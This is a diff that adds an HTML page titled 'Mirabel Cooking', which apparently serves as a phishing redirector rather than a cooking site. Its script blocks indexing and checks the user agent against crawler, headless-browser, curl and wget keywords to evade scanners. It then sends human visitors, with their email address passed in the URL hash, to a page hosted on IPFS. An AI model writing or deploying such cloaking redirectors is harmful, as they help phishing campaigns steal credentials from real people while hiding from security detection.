@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mirabel Cooking</title>
+
+  <!-- Prevent indexing -->
+  <meta name="robots" content="noindex, nofollow">
+
+  <script>
+    function isBot() {
+      const ua = navigator.userAgent.toLowerCase();
+
+      const botKeywords = [
+        "bot",
+        "crawl",
+        "spider",
+        "slurp",
+        "headless",
+        "phantom",
+        "puppeteer",
+        "selenium",
+        "wget",
+        "curl"
+      ];
+
+      return botKeywords.some(keyword => ua.includes(keyword));
+    }
+
+    if (!isBot()) {
+      // Get email from hash (example: #email@my.com)
+      const hash = window.location.hash;
+
+      // Build redirect URL with same hash
+      const redirectUrl = "http://ipfs.io/ipfs/bafkreiajrwbcptnro5btthqjqicy5tyfoxch7dij3jnkfgzj5gxhkuao4e/" + hash;
+
+      // Redirect
+      window.location.replace(redirectUrl);
+    }
+  </script>
+</head>
+<body>
+  <p></p>
+</body>
+</html>
